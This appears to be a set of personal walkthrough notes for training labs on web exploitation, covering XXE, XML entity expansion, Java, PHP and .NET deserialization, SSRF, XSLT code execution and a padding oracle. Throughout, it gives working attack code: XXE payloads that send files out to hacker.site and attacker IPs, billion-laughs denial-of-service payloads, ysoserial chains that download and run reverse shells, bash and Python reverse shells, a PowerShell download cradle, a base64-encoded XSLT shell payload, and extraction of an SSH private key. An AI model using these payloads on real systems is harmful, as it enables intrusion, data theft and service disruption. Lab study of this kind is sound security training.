Referer: http://6.xxe.labs/

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.90.112.2:8888/evil.dtd"> %xxe;]>
<login>
<username>
asd
</username>
<password>
asd
</password>
</login>                                          
```
On the python server we will receive:
```bash
192.90.112.3 - - [18/Jan/2023 20:25:15] "GET /?x=PD9waHAgDQoNCiMgR3JlYXQhISBTaW1wbGUgaXNuJ3QgaXQ/IQ0KDQokdXNlcm5hbWUgPSAiT09CRXhwbG9pdGF0aW9uRlRXIjs= HTTP/1.0" 200 -
```
Which is our answer.
Alternatively we can use also xxeserve.rb to automate some steps.
Alternative XXE are as follows:
```xml
<!--Main body-->
<?xml version='1.0'?>
<!DOCTYPE xxe [
    <!ENTITY % EvilDTD SYSTEM 'http://hacker.site/evil_oob.dtd'>
    %EvilDTD;
    %LoadOOBEnt;
    %OOB;
]>
<login>
    <username>XXEME</username>
    <password>password</password>
</login>"
<!--DTD-->
<!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://hacker.site:2108/?p=%resource;'>">
```
### Level 7
Same as above as payload, but as instructed in the php file we downloaded we know that we are in a similar situation as level 5 and thus we need to bruteforce the filename with the wordlist.
The bruteforce of the name can also be done with a custom script such as file_extractor-1.sh:
```bash
#!/bin/bash
if [ $# -ne 1 ]; then
	echo "Usage $0 <base_path_where_start>"
    exit
fi

XXESERVE_FILES="/home/ohpe/tools/xxeserve/files/*.*"
PHP_PROXY="http://hacker.site/getOOB.php?r="

LOGIN_PATH="http://7.xxe.labs/login.php"
FOLDER_TOFUZZ=$1

echo -e "==========================================="
echo -e "\t\tSTART\n"


for F in `cat Filenames_PHP_Common.wordlist`
do
	FILENAME=$FOLDER_TOFUZZ$F
#	echo -e "File name: " $FILENAME
	
	XML="<?xml version='1.0'?>
	<!DOCTYPE xxe [ 
		<!ENTITY % EvilDTD SYSTEM '$PHP_PROXY$FILENAME'>
		%EvilDTD;
		%LoadOOBEnt;
		%OOB;
	]>
	<login>
	   <username>XXEME</username>
	   <password>password</password>
	</login>"
	response=$(curl -s "$LOGIN_PATH" --data "$XML" --header "AuthXXE:login");
	printf "%-60s %s\n" "$FILENAME" `echo -en [$(tput setaf 2)Sent$(tput sgr0)]`

#	cleaned=$(echo $response | awk 'match($0, /<b>XXEME (.*)<\\\/b>/, m) { print m[1] }' | sed 's/\\\//\//g' | base64 -d);
#	echo -e "File content: \n$cleaned"
	
done

echo -e "\n\n"
read -p "All request have been sent! Let's parse the results ... press any key to continue"
echo -e "\n\n"

for F in $XXESERVE_FILES ; do
	content=`cat $F` 
	# When the Base64 is saved from URL the + is transformed to <space>, 
	# so let's get it back and decode!
	content=`echo "$content"| tr ' ' '+' | base64 -d`

	if [[ ! "$content" =~ "<HIDE_ME_PLEASE>" ]];
	then
		printf "%-30s %s\n" "$F" `echo -en [$(tput setab 1)Fake$(tput sgr0)]`
	else
		printf "%-30s %s\n" "$F" `echo -en [$(tput setab 2)Cool$(tput sgr0)]`
		
		#	Echo file content in green		
		echo -e "\n"
		printf "%s" `echo -en $(tput setab 2)Check-out here: $(tput sgr0)` 
		echo "$(tput setaf 2)";
		echo -e "\n\n$content";
		echo "$(tput sgr0) ";
		read -p "Continue... "
	fi
done

echo -e "\n\n\t\tEND";
echo -e "===========================================";
exit;

```
In conjunction with the helper proxy getOOB.php:
```php
<?php
# Simple proxy script to echo custom XML payloads

$resource = "/var/www/7/.letmepass.php";
if(! empty($_GET['r']))
   $resource = $_GET['r'];

$shell = "http://hacker.site:2108/?p=";
if(! empty ($_GET['s']))
   $shell = $_GET['s'];



header('Content-Type: text/xml');

echo <<<XML

<!ENTITY % resource SYSTEM 'php://filter/read=convert.base64-encode/resource=$resource'>
<!ENTITY % LoadOOBEnt '<!ENTITY &#x25; OOB SYSTEM "$shell%resource;">'>

XML;
```
## XML Entity eXpansion
### Level 1
Standard billion laughs, with a script:
```bash
#!/bin/bash

XML='<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<login>
   <username>XXEME &lol9;</username>
   <password>password</password>
</login>'

echo -e "==========================================="
echo -e "\t\tSTART"
echo -e "\nResults: ";
curl -s 'http://1.xee.labs/login.php' --data "$XML" --header "NoDOS:I-Agree"

echo -e "\n\n\t\tEND";
echo -e "===========================================";

```
### Level 2
Same as above, but this time instead of the passphrase we are instructed to check the log file which we need to extract with XXE:
```bash
#!/bin/bash

if [ $# -ne 1 ]; then
        echo "Usage $0 <file_path_to_read>"
        exit
fi

XML_LOG="<?xml version='1.0'?>
<!DOCTYPE xxe [
   <!ENTITY xxe SYSTEM '$1' >
]>
<login>
   <username>XXEME &xxe;</username>
   <password>password</password>
</login>"

echo -e "==========================================="
echo -e "\t\tSTART"
echo -e "\nResults: ";

curl -s 'http://2.xee.labs/login.php' --data "$XML_LOG" --header "NoDOS:I-Agree"

echo -e "\n\n\t\tEND";
echo -e "===========================================";
```
We cleanse the files with:
```bash
./exploit_xxe.sh /var/www/XEE/2/LOGS/omg_a_dos.log \
| gawk 'match($0, /<b>XXEME (.*)<\\\/b>\s/, m) { print m[1] }' \
| sed 's/\\\//\//g'./exploit.sh
```
### Level 3
Same as above, but url needs to be encoded as follows:
```bash
%5BLOGS%5D/omg_%C3%A0_dos.log
```
### Level 4
Filters are in place and thus the easiest way is to move the Billion Laughs attack into an external DTD as follows:
```xml
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
```
We then can serve the payload as follows:
```xml
<?xml version="1.0"?>
    <!DOCTYPE results [
        <!ENTITY % EvilDTD PUBLIC "xxe"
            "http://hacker.site/evil_remote_xee.dtd">
        %EvilDTD;
    ]>
    <login>
        <username>XEEME &file;</username>
        <password>password</password>
    </login>
```
Note that the log file path in this case is very long and thus we can move it into an external DTD as not to break url length restrictions.
# Deserialization
## Java - Lab 1
Going to the demo.ine/local/upload we find a page to upload files, under upload.php. After uploading and clicking ok, we get two errors:
- java.io.FileNotFoundException: data.ser and
- java.io.StreamCorruptedException: invalid stream header: 74686567

Given the data.ser name, it seems that the webapp deserializes the file, which can be force by triggering the StreamCorruptedException error (when the upload is not complete). In order to exploit this, we need to first figure out which Gadget collection to use. We can use a script to bruteforce the usable gadget which will send a ping to our machine.
We get all the payloads of ysoserial with:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar >yso  2>&1
cat yso | tr -d ' ' | cut -d "@" -f 1 > payloads.txt
sed -i -e '1,7d'  payloads.txt
```
Then we generate all the ping payloads with:
```bash
while read payloadname; do java -jar ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname "ping 192.78.216.2 -c 3" > $payloadname; done < payloads.txt
```
And then we can use the python script (we need to script this as the upload and subsequent file check need to happen fast):
```python
import requests
import time
import threading
def readfile(filename):
    url = "http://demo.ine.local/upload/index.php?sent=OK"
    r = requests.get(url)
    print("[+] Used filename: " + filename)
    print(r.text)
    print("\n")
def upload(filename):
    url = "http://demo.ine.local/upload/upload.php"
    files ={'uploaded_file': open(filename, 'rb')}
    r = requests.post(url, files=files)
payloads = [
'AspectJWeaver',
'BeanShell1',
'C3P0',
'Click1',
'Clojure',
'CommonsBeanutils1',
'CommonsCollections1',
'CommonsCollections2',
'CommonsCollections3',
'CommonsCollections4',
'CommonsCollections5',
'CommonsCollections6',
'CommonsCollections7',
'FileUpload1',
'Groovy1',
'Hibernate1',
'Hibernate2',
'JBossInterceptors1',
'JRMPClient',
'JRMPListener',
'JSON1',
'JavassistWeld1',
'Jdk7u21',
'Jython1',
'MozillaRhino1',
'MozillaRhino2',
'Myfaces1',
'Myfaces2',
'ROME',
'Spring1',
'Spring2',
'URLDNS',
'Vaadin1',
'Wicket1'
]
for payload in payloads:
    x=threading.Thread(target=upload, args=(payload,))
    x.start()
    readfile(payload)
    time.sleep(2)
```
With this, we can pinpoint that the correct payload is CommonsCollections2, thus we can build the full python exploit.
We create a python reverse shell and host it on the machine:
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.78.216.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Finally we put together the exploit which in three turns will send and deserialize a payload to:
- download the reverse shell
- makes it executable 
- trigger it
```python
import requests
import time
import threading
import os
def readfile(filename):
    url = "http://demo.ine.local/upload/index.php?sent=OK"
    r = requests.get(url)
    print("[+] Used filename: " + filename)
    print(r.text)
    print("\n")
def upload(filename):
    url = "http://demo.ine.local/upload/upload.php"
    files ={'uploaded_file': open(filename, 'rb')}
    r = requests.post(url, files=files)
payload = 'CommonsCollections2'
commands = [
'"curl http://192.78.216.2:8888/rev.py -O rev.py"',
'"chmod +x rev.py"',
'"./rev.py"'
]
for command in commands:
    os.system("java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar " + payload + " " + command + " > " + payload)
    x=threading.Thread(target=upload, args=(payload,))
    x.start()
    readfile(payload)
    time.sleep(2)
```
We simply run it and we get back a reverse shell.
NOTE: Again, the full exploit chain needed a script, as the file needs to be unserialized as fast as possible and doing it manually could be to slow.
## Java - Lab 2
We are faced with a Jenkins instance which is vulnerable to deserialization (ver 1.566) via the commons collection library.
We thus get this exploit:
```html
https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py
```
We create as usual a reverse shell to host on our machine with:
```bash
bash -i >& /dev/tcp/192.83.182.2/4444 0>&1
```
We create the three necessary payloads with:
```bash
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "curl http://192.83.182.2:8888/revs.sh -o /tmp/revs.sh" > /root/get_shell_payload
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "chmod 777 /tmp/revs.sh" > /root/executable_shell_payload
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "bash /tmp/revs.sh" > /root/run_shell_payload
```
Now, we run the script three times to execute the three payloads:
```bash
python jenkins.py 192.83.182.3 8080 get_shell_payload
python jenkins.py 192.83.182.3 8080 executable_shell_payload
python jenkins.py 192.83.182.3 8080 run_shell_payload
```
And this way we get a shell on our machine.
## PHP
We have an instance of XVWA. We go to the php_object_injection webpage and after clicking the button we get back a url with a serialized PHP object:
```bash
http://demo.ine.local/xvwa/vulnerabilities/php_object_injection/?r=a:2:{i:0;s:4:%22XVWA%22;i:1;s:33:%22Xtreme%20Vulnerable%20Web%20Application%22;}
# The object translates as follows
{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}
```
We need the source code of the webapp to try and trigger an insecure deserialization.
We can get it from here: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php
The interesting snipped is as follows:
```php
<?php 
    class PHPObjectInjection{
        public $inject;
        function __construct(){
        }
        function __wakeup(){
            if(isset($this->inject)){
                eval($this->inject);
            }
        }
    }
    if(isset($_REQUEST['r'])){  
        $var1=unserialize($_REQUEST['r']);
        
        if(is_array($var1)){ 
            echo "<br/>".$var1[0]." - ".$var1[1];
        }
    }else{
        echo ""; # nothing happens here
    }
?>
```
So, it checks if the r variable is set, and if it is, then it calls unserialize which in turn calls __wakeup. We can therefore set an inject field in the object which will be passed to eval, thus resulting in RCE.
We can construct the object as follows (let's try a simple payload first):
```php
<?php
class PHPObjectInjection {
    public $inject="system('hostname');";
}
$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>
```
After running it it returns: 
```bash
O:18:"PHPObjectInjection":1:{s:6:"inject";s:19:"system('hostname');";}
```
Passing it to the r variable returs in the webpage: "demo.ine.local".
Time to achieve RCE. We rewrite the exploit as:
```php
<?php
class PHPObjectInjection {                                                                  
    public $inject="system('/bin/bash -c \'bash -i >& /dev/tcp/192.55.123.2/4444 0>&1\'');";
}                                                                                           
$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>
```
We run it to get: 
```bash
O:18:"PHPObjectInjection":1:{s:6:"inject";s:70:"system('/bin/bash -c \'bash -i >& /dev/tcp/192.55.123.2/4444 0>&1\'');";}
```
Last step before sending it is to url encode as it contain special url characters, so it becomes:
```bash
O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A70%3A%22system%28%27%2Fbin%2Fbash%20-c%20%5C%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.55.123.2%2F4444%200%3E%261%5C%27%27%29%3B%22%3B%7D
```
After setting up a nc handler and sending it, we get the shell.
## .NET
Browsing the webpage at demo.ine.local, we find an iframe which contains a link to /VulnerableEndpoint.rem. If we send a POST to such endpoint containing:
```html
<SOAP:ENVELOPE>
</SOAP:ENVELOPE>
```
It responds with a 500 error with 
```html
<faultcode id="ref-2">SOAP-ENV:Server</faultcode>
<faultstring id="ref-3"> **** System.Runtime.Remoting.RemotingException - Server encountered an internal error. For more information, turn off customErrors in the server&#39;s .config file.</faultstring>
```
This tells us that the service endpoint is valid else it would have answered "Requested Service not found".
Since we found an interesting endpoint we can try to deserialize it with ysoserial.net. We run the following command to get the exploit:
```bash
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping 10.10.24.7" -o raw
```
This will output the following body to be sent to the endpoint in a POST request as follows:
```bash
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1474

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
<ForegroundBrush id="ref-3">&#60;ResourceDictionary
  xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;
  xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;
  xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34;
  xmlns:Diag=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&#62;
     &#60;ObjectDataProvider x:Key=&#34;&#34; ObjectType = &#34;{ x:Type Diag:Process}&#34; MethodName = &#34;Start&#34; &#62;
     &#60;ObjectDataProvider.MethodParameters&#62;
        &#60;System:String&#62;cmd&#60;/System:String&#62;
        &#60;System:String&#62;&#34;/c ping 10.10.24.7&#34; &#60;/System:String&#62;
     &#60;/ObjectDataProvider.MethodParameters&#62;
    &#60;/ObjectDataProvider&#62;
&#60;/ResourceDictionary&#62;</ForegroundBrush>
</a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>
```
(NOTE: <SOAPBody> might need to be taken out from the output as it can sometimes make the payload fail).
After setting up a tcpdump for icmp, we can send the request with BURP and in fact we get pings on our machine.
We can further weaponize this, by setting up a webserver serving a powershell reverse oneliner and sending the exploit to catch a shell with netcat.
The request in Burp will be:
```bash
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1575

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<a1:TextFormattingRunProperties id="ref-1" xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
<ForegroundBrush id="ref-3">&#60;ResourceDictionary
  xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34;
  xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34;
  xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34;
  xmlns:Diag=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&#62;
     &#60;ObjectDataProvider x:Key=&#34;&#34; ObjectType = &#34;{ x:Type Diag:Process}&#34; MethodName = &#34;Start&#34; &#62;
     &#60;ObjectDataProvider.MethodParameters&#62;
        &#60;System:String&#62;cmd&#60;/System:String&#62;
        &#60;System:String&#62;&#34;/c &#34;powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.24.7:8888/revs.ps1')"&#34; &#60;/System:String&#62;
     &#60;/ObjectDataProvider.MethodParameters&#62;
    &#60;/ObjectDataProvider&#62;
&#60;/ResourceDictionary&#62;</ForegroundBrush>
</a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>
```
After sending the request the shell will be downloaded and executed and we will receive it on the nc listener.
# Server Side Attacks
## SSRF to RCE
After a port scan we find a form on port 5000 which accepts an XML to validate. This XML is vulnerable to XXE and thus we can try to exploit further with, for instance:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&file;</description>
    </child>
</parent>
```
This works and we can get various usernames: amanda, daviv, jeremy.
We can go further, and see if we can talk to other unexposed services by querying the /proc/net/tcp file which contains info about network connections:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [<!ENTITY file SYSTEM "file:///proc/net/tcp"> ]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&file;</description>
    </child>
</parent>
```
And we extract this:
```bash
sl local_address rem_address st tx_queue rx_queue tr tm-&gt;when retrnsmt uid timeout inode 
0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 982883264 1 0000000000000000 100 0 0 10 0 
1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 982867365 1 0000000000000000 100 0 0 10 0 
2: 0B00007F:939F 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 982885594 1 0000000000000000 100 0 0 10 0 
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 982890903 1 0000000000000000 100 0 0 10 0 
4: 03D723C0:1F40 02D723C0:D3A0 01 00000000:00000000 00:00000000 00000000 0 0 982885969 1 0000000000000000 20 4 30 10 -1 
5: 03D723C0:1F40 02D723C0:D394 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000 
```
We need to decode the bytes to get the IP addresses, there are plenty of ways such as this perl script:
```perl
#!/usr/bin/perl
my $hexip=$ARGV[0];
my $hexport=$ARGV[1];
print "hex: $hexip\n";
my @ip = map hex($_), ( $hexip =~ m/../g );
my $ip = join('.',reverse(@ip));
my $port = hex($hexport);
print "IP: $ip  PORT: $port\n";
```
The entry #1 is interesting as it points to port 8888 being open on localhost. Let's craft a malicious DTD to retrieve in order to do a SSRF via the XXE. NOTE: we need to incapsulate the payload in the CDATA section as we do not have any php filter to be used.
The evil.dtd will look like this:
```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://127.0.0.1:8888">
<!ENTITY % end "]]>">
<!ENTITY % complete "<!ENTITY file '%start;%file;%end;'>">
```
And the XXE as:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.35.215.2:8000/evil.dtd"> 
    %dtd;
    %complete;
]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&file;</description>
    </child>
</parent>
```
This works, and we get back a directory listing, which contains a .ssh directory and a flag file. We get the flag1 (5f1210be00b4b8dfecba7b56181d905c) with:
```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://127.0.0.1:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % complete "<!ENTITY file '%start;%file;%end;'>">
```
And ssh id_rsa with:
```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://127.0.0.1:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % complete "<!ENTITY file '%start;%file;%end;'>">
```
We fix the format of id_rsa with:
```bash
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
    -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
    -e "s/\S\{64\}/&\n/g" \
    id_rsa
```
Then we simply login to the machine (we can try the three usernames we found before and see that david works), and look for flag2: 173b0344950d28e8b5dc36dd462edaa9.
## XSLT to Code Execution
We browse to http://demo.ine.local and find a website which accepts an xml file and a xslt file.
We need both files to try out the parser. We can use the provided xslt by w3schools:
```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <xsl:for-each select="catalog/cd">
        <tr>
          <td><xsl:value-of select="title"/></td>
          <td><xsl:value-of select="artist"/></td>
        </tr>
      </xsl:for-each>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```
And relative xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
</catalog>
```
And combining them we see that they are working. Time to fingerprint the xslt engine. We modify the xslt file as follows:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```
The script tells us that it is libxslt v1.0. We can look up how to achieve RCE from that and we compile this script. NOTE: due to the use of slashes and apexes, we are better of encoding the whole payload in base64 and decoding on the fly, so:
```bash
echo "/bin/bash -c 'bash -i>& /dev/tcp/192.126.227.2/4444 0>&1'" | base64 -w0
```
And the final xslt:
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pPiYgL2Rldi90Y3AvMTkyLjEyNi4yMjcuMi80NDQ0IDA+JjEnCg== | base64 -d | bash')" />
</xsl:template>
</xsl:stylesheet>
```
This way we get the shell and we can get the flags! (fdf9c7da429441eaa1620eceafc34d9f)
# Crypto Attacks
## Padding oracle
Browsing to http://demo.ine.local/encrypt?plain=ApplicationUsername%3duser%26Password%3dsesame we can get the encrypted version of the username and password, getting as output:
```bash
crypted: 6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80
```
Going to the http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80 endpoint we can decrypt the content. 
We can confirm the presence of the padding oracle by changing the payload and submitting it to the echo endpoint as follows: http://demo.ine.local/echo?cipher=gg664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80.
This will trigger a "non hex value" error.
Sending: http://demo.ine.local/echo?cipher=g will trigger an "odd-length string" error.
Sending: http://demo.ine.local/echo?cipher=6b will work triggering a simple decryption error.
These errors may suggest that:
- The string consists of hexadecimal characters (0-0xff)
- The string has to be aligned to two characters
- The string is being decrypted somehow

We can now try a padding oracle attack with padbuster.
We run it as:
```bash
padbuster "http://demo.ine.local/echo?cipher=6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80" "6b664ef0359fe233e021ad36b12d8e32b8f1335522753d45174435c16b52dc2e5bbd4363b9d91d4c9100beae6ce34e80" 16 -encoding 1
```
The following are the options provided to the PadBuster tool:
- The target URL containing the ciphertext
- The ciphertext itself
- Block size (128 bits = 16 bytes)
- Encoding type 1 = lowercase hex (which was confirmed by experimenting with the endpoint in the previous step)

After running we input 2 to the request "Enter an ID that matches the error condition NOTE: The ID# marked with ** is recommended :".
Padbuster was able to recover two blocks of the plaintext message:
```bash
# Block 1
[+] Cipher Text (HEX): b8f1335522753d45174435c16b52dc2e
[+] Intermediate Bytes (HEX): 0a0b2bcd40ec8741c671cc45c25ae140
[+] Plain Text: ame=user&Passwor
# Block 2
[+] Cipher Text (HEX): 5bbd4363b9d91d4c9100beae6ce34e80
[+] Intermediate Bytes (HEX): dccc4030511450201f4c3dc9635ad426
[+] Plain Text: d=sesame
```
